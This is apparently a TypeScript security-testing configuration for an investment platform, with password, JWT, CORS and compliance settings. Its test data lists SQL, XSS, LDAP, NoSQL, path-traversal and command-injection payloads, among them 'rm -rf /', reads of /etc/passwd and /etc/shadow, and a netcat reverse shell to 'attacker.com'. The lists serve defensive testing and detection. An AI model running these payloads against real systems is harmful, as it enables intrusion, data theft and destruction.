/**
 * Security Testing Configuration
 * 
 * This file contains configuration and utilities for security testing
 * including test data, mock services, and security validation helpers.
 */

export const SECURITY_TEST_CONFIG = {
  // Password policy configuration
  passwordPolicy: {
    minLength: 12,
    requireUppercase: true,
    requireLowercase: true,
    requireNumbers: true,
    requireSpecialChars: true,
    maxAge: 90, // days
    preventReuse: 12, // last N passwords
    lockoutThreshold: 5,
    lockoutDuration: 900 // 15 minutes in seconds
  },

  // JWT configuration
  jwtConfig: {
    algorithm: 'HS256',
    maxAge: 3600, // 1 hour in seconds
    refreshMaxAge: 604800, // 7 days in seconds
    issuer: 'investment-ai-agent',
    audience: 'investment-ai-users'
  },

  // Rate limiting configuration
  rateLimiting: {
    general: {
      windowMs: 15 * 60 * 1000, // 15 minutes
      maxRequests: 100
    },
    authentication: {
      windowMs: 15 * 60 * 1000, // 15 minutes
      maxRequests: 5
    },
    fileUpload: {
      windowMs: 60 * 60 * 1000, // 1 hour
      maxRequests: 10
    }
  },

  // File upload security
  fileUpload: {
    maxFileSize: 10 * 1024 * 1024, // 10MB
    allowedMimeTypes: [
      'text/csv',
      'application/pdf',
      'application/vnd.ms-excel',
      'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
      'application/json',
      'text/plain'
    ],
    quarantineDirectory: '/tmp/quarantine',
    scanTimeout: 30000 // 30 seconds
  },

  // Encryption configuration
  encryption: {
    algorithm: 'aes-256-gcm',
    keyLength: 32,
    ivLength: 16,
    tagLength: 16,
    saltLength: 16
  },

  // Session management
  session: {
    maxAge: 3600, // 1 hour
    secure: true,
    httpOnly: true,
    sameSite: 'strict',
    regenerateOnLogin: true
  },

  // CORS configuration
  cors: {
    allowedOrigins: process.env.ALLOWED_ORIGINS?.split(',') || ['https://localhost:3000'],
    allowedMethods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
    credentials: true,
    maxAge: 86400 // 24 hours
  },

  // Security headers
  securityHeaders: {
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'DENY',
    'X-XSS-Protection': '1; mode=block',
    'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
    'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'",
    'Referrer-Policy': 'strict-origin-when-cross-origin',
    'Permissions-Policy': 'geolocation=(), microphone=(), camera=()'
  }
};

export const SECURITY_TEST_DATA = {
  // Weak passwords for testing
  weakPasswords: [
    '123456',
    'password',
    'qwerty',
    'abc123',
    '12345678',
    'password123',
    'admin',
    'letmein',
    'welcome',
    'monkey'
  ],

  // Strong passwords for testing
  strongPasswords: [
    'SecureP@ssw0rd123!',
    'MyStr0ng&C0mpl3xP@ssw0rd',
    'Inv3stm3nt@I_Ag3nt2024!',
    'C0mpl1@nt&S3cur3P@ss',
    'Str0ng!P@ssw0rd#2024'
  ],

  // SQL injection payloads
  sqlInjectionPayloads: [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "'; INSERT INTO users VALUES ('hacker', 'password'); --",
    "' UNION SELECT * FROM sensitive_data --",
    "admin'--",
    "admin'/*",
    "' OR 1=1--",
    "' OR 'a'='a",
    "') OR ('1'='1",
    "1' AND (SELECT COUNT(*) FROM users) > 0 --"
  ],

  // XSS payloads
  xssPayloads: [
    '<script>alert("XSS")</script>',
    'javascript:alert("XSS")',
    '<img src="x" onerror="alert(\'XSS\')">',
    '<svg onload="alert(\'XSS\')">',
    '"><script>alert("XSS")</script>',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<body onload="alert(\'XSS\')">',
    '<input type="text" value="" onfocus="alert(\'XSS\')" autofocus>',
    '<marquee onstart="alert(\'XSS\')">',
    '<video><source onerror="alert(\'XSS\')">'
  ],

  // Command injection payloads
  commandInjectionPayloads: [
    '; rm -rf /',
    '| cat /etc/passwd',
    '&& curl malicious-site.com',
    '`whoami`',
    '$(id)',
    '; nc -e /bin/sh attacker.com 4444',
    '| ls -la',
    '&& echo "hacked"',
    '; cat /etc/shadow',
    '`cat /proc/version`'
  ],

  // Path traversal payloads
  pathTraversalPayloads: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',
    '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
    '../../../proc/self/environ',
    '..\\..\\..\\boot.ini',
    '../../../var/log/apache/access.log',
    '....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam'
  ],

  // LDAP injection payloads
  ldapInjectionPayloads: [
    '*)(uid=*))(|(uid=*',
    '*)(|(password=*))',
    '*)(&(password=*))',
    '*))%00',
    '*()|%26\'',
    '*)(objectClass=*',
    '*))(|(objectClass=*',
    '*)(cn=*))(|(cn=*',
    '*))(|(mail=*@*',
    '*)(userPassword=*'
  ],

  // NoSQL injection payloads
  nosqlInjectionPayloads: [
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
    '{"$where": "this.password.match(/.*/)"}',
    '{"$or": [{"username": "admin"}, {"username": "administrator"}]}',
    '{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}',
    '{"$where": "return true"}',
    '{"$regex": "^.*$"}',
    '{"$exists": true}',
    '{"$type": 2}'
  ],

  // PII test data
  piiTestData: {
    ssn: '123-45-6789',
    creditCard: '4111-1111-1111-1111',
    email: 'john.doe@example.com',
    phone: '555-123-4567',
    address: '123 Main Street, Anytown, USA',
    ipAddress: '192.168.1.1',
    dateOfBirth: '01/01/1990'
  },

  // Malicious file content
  maliciousFileContent: {
    scriptInjection: '<script>alert("XSS in file")</script>',
    sqlInjection: "'; DROP TABLE files; --",
    commandInjection: '; rm -rf /',
    pathTraversal: '../../../etc/passwd',
    binaryPayload: Buffer.from([0x4d, 0x5a, 0x90, 0x00]) // PE header
  }
};

export const COMPLIANCE_TEST_CONFIG = {
  // Regulatory frameworks
  regulations: {
    sec: {
      name: 'SEC Investment Company Act',
      jurisdiction: 'US',
      applicableInvestmentTypes: ['stock', 'bond', 'etf', 'mutual-fund'],
      concentrationLimits: {
        singleIssuer: 0.05, // 5%
        singleSector: 0.25, // 25%
        illiquidAssets: 0.15 // 15%
      }
    },
    mifidII: {
      name: 'MiFID II',
      jurisdiction: 'EU',
      applicableInvestmentTypes: ['stock', 'bond', 'derivative', 'commodity'],
      suitabilityRequirements: true,
      bestExecutionRequired: true,
      complexInstrumentWarnings: true
    },
    gdpr: {
      name: 'General Data Protection Regulation',
      jurisdiction: 'EU',
      dataSubjectRights: [
        'access', 'rectification', 'erasure', 'portability',
        'restriction', 'objection', 'automated-decision-making'
      ],
      processingTimeframes: {
        standardRequest: 30, // days
        complexRequest: 90 // days
      }
    },
    ccpa: {
      name: 'California Consumer Privacy Act',
      jurisdiction: 'US-CA',
      consumerRights: [
        'know', 'delete', 'opt-out', 'non-discrimination'
      ],
      processingTimeframes: {
        standardRequest: 45, // days
        verificationRequired: true
      }
    }
  },

  // ESG criteria
  esgCriteria: {
    environmental: [
      'carbon_emissions',
      'water_usage',
      'waste_management',
      'renewable_energy',
      'environmental_compliance'
    ],
    social: [
      'labor_practices',
      'human_rights',
      'community_impact',
      'product_safety',
      'data_privacy'
    ],
    governance: [
      'board_independence',
      'executive_compensation',
      'shareholder_rights',
      'business_ethics',
      'risk_management'
    ]
  },

  // Risk assessment criteria
  riskCriteria: {
    marketRisk: {
      volatilityThresholds: {
        low: 0.15,
        medium: 0.30,
        high: 0.50,
        veryHigh: 0.80
      },
      betaThresholds: {
        low: 0.8,
        medium: 1.2,
        high: 1.8,
        veryHigh: 2.5
      }
    },
    creditRisk: {
      ratingThresholds: {
        investmentGrade: ['AAA', 'AA', 'A', 'BBB'],
        speculativeGrade: ['BB', 'B', 'CCC', 'CC', 'C'],
        default: ['D']
      }
    },
    liquidityRisk: {
      tradingVolumeThresholds: {
        high: 1000000, // shares per day
        medium: 100000,
        low: 10000,
        veryLow: 1000
      }
    }
  }
};

export const PRIVACY_TEST_CONFIG = {
  // Data categories for privacy testing
  dataCategories: {
    personalIdentifiers: [
      'name', 'email', 'phone', 'address', 'ssn', 'passport',
      'drivers_license', 'employee_id', 'customer_id'
    ],
    financialData: [
      'bank_account', 'credit_card', 'investment_account',
      'transaction_history', 'credit_score', 'income'
    ],
    biometricData: [
      'fingerprint', 'facial_recognition', 'voice_print',
      'retina_scan', 'dna_profile'
    ],
    healthData: [
      'medical_records', 'health_insurance', 'prescription_history',
      'mental_health', 'genetic_information'
    ],
    behavioralData: [
      'browsing_history', 'search_queries', 'location_data',
      'app_usage', 'social_media_activity'
    ]
  },

  // Consent purposes
  consentPurposes: [
    {
      id: 'essential_services',
      name: 'Essential Services',
      description: 'Core functionality of the investment platform',
      required: true,
      category: 'necessary'
    },
    {
      id: 'personalization',
      name: 'Personalization',
      description: 'Customize investment recommendations',
      required: false,
      category: 'preferences'
    },
    {
      id: 'marketing',
      name: 'Marketing Communications',
      description: 'Send promotional emails and updates',
      required: false,
      category: 'marketing'
    },
    {
      id: 'analytics',
      name: 'Analytics and Improvement',
      description: 'Analyze usage patterns to improve services',
      required: false,
      category: 'analytics'
    },
    {
      id: 'third_party_sharing',
      name: 'Third-Party Sharing',
      description: 'Share data with trusted partners',
      required: false,
      category: 'sharing'
    }
  ],

  // Data retention periods (in days)
  retentionPeriods: {
    personalData: 7 * 365, // 7 years
    financialTransactions: 7 * 365, // 7 years
    auditLogs: 7 * 365, // 7 years
    systemLogs: 2 * 365, // 2 years
    marketingData: 3 * 365, // 3 years
    analyticsData: 2 * 365, // 2 years
    sessionData: 30, // 30 days
    temporaryFiles: 7 // 7 days
  },

  // Countries with adequacy decisions (GDPR)
  adequateCountries: [
    'Andorra', 'Argentina', 'Canada', 'Faroe Islands', 'Guernsey',
    'Israel', 'Isle of Man', 'Japan', 'Jersey', 'New Zealand',
    'South Korea', 'Switzerland', 'United Kingdom', 'Uruguay'
  ]
};

// Security testing utilities
export class SecurityTestUtils {
  /**
   * Generate test JWT token
   */
  static generateTestJWT(payload: any, secret: string = 'test-secret', expiresIn: string = '1h'): string {
    const jwt = require('jsonwebtoken');
    return jwt.sign(payload, secret, { expiresIn });
  }

  /**
   * Generate expired JWT token
   */
  static generateExpiredJWT(payload: any, secret: string = 'test-secret'): string {
    const jwt = require('jsonwebtoken');
    return jwt.sign(payload, secret, { expiresIn: '-1h' });
  }

  /**
   * Generate malicious file for testing
   */
  static generateMaliciousFile(type: 'script' | 'sql' | 'command' | 'binary'): Buffer {
    switch (type) {
      case 'script':
        return Buffer.from(SECURITY_TEST_DATA.maliciousFileContent.scriptInjection);
      case 'sql':
        return Buffer.from(SECURITY_TEST_DATA.maliciousFileContent.sqlInjection);
      case 'command':
        return Buffer.from(SECURITY_TEST_DATA.maliciousFileContent.commandInjection);
      case 'binary':
        return SECURITY_TEST_DATA.maliciousFileContent.binaryPayload;
      default:
        return Buffer.from('malicious content');
    }
  }

  /**
   * Validate password strength
   */
  static validatePasswordStrength(password: string): {
    isStrong: boolean;
    score: number;
    feedback: string[];
  } {
    const feedback: string[] = [];
    let score = 0;

    if (password.length >= SECURITY_TEST_CONFIG.passwordPolicy.minLength) {
      score += 20;
    } else {
      feedback.push(`Password must be at least ${SECURITY_TEST_CONFIG.passwordPolicy.minLength} characters long`);
    }

    if (/[A-Z]/.test(password)) {
      score += 20;
    } else {
      feedback.push('Password must contain at least one uppercase letter');
    }

    if (/[a-z]/.test(password)) {
      score += 20;
    } else {
      feedback.push('Password must contain at least one lowercase letter');
    }

    if (/\d/.test(password)) {
      score += 20;
    } else {
      feedback.push('Password must contain at least one number');
    }

    if (/[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password)) {
      score += 20;
    } else {
      feedback.push('Password must contain at least one special character');
    }

    return {
      isStrong: score >= 80,
      score,
      feedback
    };
  }

  /**
   * Check if input contains potential injection
   */
  static containsInjection(input: string): {
    hasSQLInjection: boolean;
    hasXSS: boolean;
    hasCommandInjection: boolean;
    hasPathTraversal: boolean;
  } {
    return {
      hasSQLInjection: SECURITY_TEST_DATA.sqlInjectionPayloads.some(payload => 
        input.toLowerCase().includes(payload.toLowerCase())
      ),
      hasXSS: SECURITY_TEST_DATA.xssPayloads.some(payload => 
        input.toLowerCase().includes(payload.toLowerCase())
      ),
      hasCommandInjection: SECURITY_TEST_DATA.commandInjectionPayloads.some(payload => 
        input.includes(payload)
      ),
      hasPathTraversal: SECURITY_TEST_DATA.pathTraversalPayloads.some(payload => 
        input.includes(payload)
      )
    };
  }
}